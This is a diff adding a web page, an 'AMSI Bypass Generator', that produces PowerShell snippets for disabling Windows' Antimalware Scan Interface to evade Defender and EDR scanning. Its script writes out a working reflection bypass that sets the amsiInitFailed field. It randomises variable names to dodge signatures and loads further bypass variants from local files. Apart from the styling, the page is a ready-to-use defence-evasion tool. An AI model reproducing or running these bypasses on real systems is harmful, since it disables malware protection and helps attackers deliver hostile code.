@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <title>AMSI Bypass Generator</title>
+  <link href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+  <style>
+    @keyframes matrix-glow {
+      0% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; }
+      100% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; }
+    }
+
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 0.9; }
+      20%, 24%, 55% { opacity: 0.4; }
+    }
+
+    .matrix-quote {
+      margin-top: 80px;
+      font-size: 1.2em;
+      color: #00ff00;
+      font-family: 'Times New Roman', Times, serif;
+      text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00;
+      animation: matrix-glow 1.5s infinite alternate, flicker 3s infinite;
+      letter-spacing: 1px;
+      opacity: 0.9;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 15px 20px;
+      border-radius: 8px;
+      display: inline-block;
+    }
+
+    @keyframes fadeInTypewriter {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    #output.animate {
+      animation: fadeInTypewriter 0.5s ease-out;
+      transition: all 0.5s;
+    }
+
+    body {
+      background-color: #0d0d0d;
+      color: #00ffcc;
+      font-family: 'Courier New', Courier, monospace;
+      text-align: center;
+      padding: 50px;
+    }
+
+    h1 {
+      font-size: 2.5em;
+      text-shadow: 0 0 20px #00ffcc;
+    }
+
+    button {
+      background-color: transparent;
+      border: 2px solid #00ffcc;
+      color: #00ffcc;
+      font-size: 1.2em;
+      padding: 10px 20px;
+      cursor: pointer;
+      transition: 0.3s;
+      text-shadow: 0 0 5px #00ffcc;
+      border-radius: 10px;
+    }
+
+    button:hover {
+      background-color: #00ffcc;
+      color: #0d0d0d;
+      text-shadow: none;
+    }
+
+    pre {
+      background-color: #1a1a1a;
+      padding: 20px;
+      margin-top: 30px;
+      text-align: left;
+      box-shadow: 0 0 20px #00ffcc;
+      border-radius: 10px;
+      overflow-x: auto;
+    }
+
+    code {
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 0.95em;
+    }
+
+    .footer {
+      margin-top: 50px;
+      font-size: 0.8em;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <h1>💀 AMSI Bypass Generator 💀</h1>
+  <p style="color: #00ffcc; font-size: 1.1em; text-shadow: 0 0 10px #00ffcc;">
+    Generates PowerShell snippet that either disables AMSI or manipulates <code>amsiScanBuffer</code> function to evade Defender/EDR scans.
+  </p>
+  <button onclick="generateBypass()">Generate</button>
+  <pre><code id="output" class="language-powershell">Click "Generate" to get a bypass script</code></pre>
+
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+
+  <div class="matrix-quote">
+    "If you want to stop an evil then you have to think like him"
+  </div>
+
+  <script>
+    const bypassFileCount = 11;
+    const bypassFolder = 'bypasses';
+
+    function getRandomVarName() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+      let result = '';
+      for (let i = 0; i < 5; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+
+    function generateDynamicBypass() {
+      const var1 = getRandomVarName();
+      const var2 = getRandomVarName();
+
+      return `# Dynamic Reflection Variant Works Only in Defender
+$${var1} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$${var2} = $${var1}.GetField('amsiInitFailed','NonPublic,Static')
+$${var2}.SetValue([object]$null,$true)`;
+    }
+
+    async function generateBypass() {
+      const useDynamic = Math.random() < 0.3;
+
+      const outputElement = document.getElementById("output");
+      outputElement.classList.remove("animate");
+      void outputElement.offsetWidth;
+
+      if (useDynamic) {
+        const code = generateDynamicBypass();
+        outputElement.textContent = code;
+        Prism.highlightElement(outputElement);
+        outputElement.classList.add("animate");
+      } else {
+        const randomIndex = Math.floor(Math.random() * bypassFileCount) + 1;
+        const url = `${bypassFolder}/bypass${randomIndex}.txt`;
+
+        try {
+          const response = await fetch(url);
+          if (!response.ok) throw new Error("File not found");
+          const text = await response.text();
+          outputElement.textContent = text.trim();
+          Prism.highlightElement(outputElement);
+          outputElement.classList.add("animate");
+        } catch (err) {
+          outputElement.textContent = `Error loading script: ${err.message}`;
+        }
+      }
+    }
+  </script>
+
+  <div style="margin-top: 40px; display: flex; justify-content: center; gap: 20px;">
+    <button onclick="window.location.href='resource.html'">contributers</button>
+    <button onclick="window.location.href='https://www.linkedin.com/in/shaquib-izhar/'">>_whoami</button>
+  </div>
+</body>
+</html>
